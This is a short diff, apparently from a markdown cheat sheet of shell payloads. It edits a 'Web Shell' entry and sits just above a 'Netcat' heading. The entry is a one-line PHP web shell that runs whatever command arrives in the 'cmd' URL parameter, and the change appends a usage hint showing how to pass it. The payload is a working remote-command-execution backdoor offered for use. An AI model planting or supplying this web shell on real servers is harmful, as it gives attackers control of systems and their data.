@@ -17,7 +17,7 @@
 * Web Shell
 
   ```bash
-  <?php system($_GET['cmd']);?>
+  <?php system($_GET['cmd']);?>                               (&cmd=)
   ```
 
 * Netcat
